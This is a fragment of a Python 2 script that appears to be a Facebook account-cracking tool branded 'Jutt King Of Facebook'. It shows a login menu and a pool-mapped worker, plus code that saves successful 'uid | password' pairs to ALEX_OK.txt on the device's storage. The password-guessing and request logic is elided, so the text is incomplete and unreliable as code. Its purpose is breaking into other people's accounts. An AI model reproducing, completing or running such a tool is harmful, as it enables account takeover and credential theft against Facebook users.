...
def log_menu():
    ...
    try:
        ...
        os.system('clear')
        print logo
        print '\033[1;90m ______ Login menu _____\033[1;94m'
...
def a_s():
   ...
   a_s = raw_input(' \033[1;93mSelect One: ')
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;92mJutt King Of Facebook\033[1;94m'
    print 47 * '-'
            ...
            if 'loc' in q:
                ...
                if 'loc' in q:
                    ...
                    if 'loc' in q:
                        ...
                        ok = open('/sdcard/ids/ALEX_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mPROCCESS HAS BEEN COMPLETED'
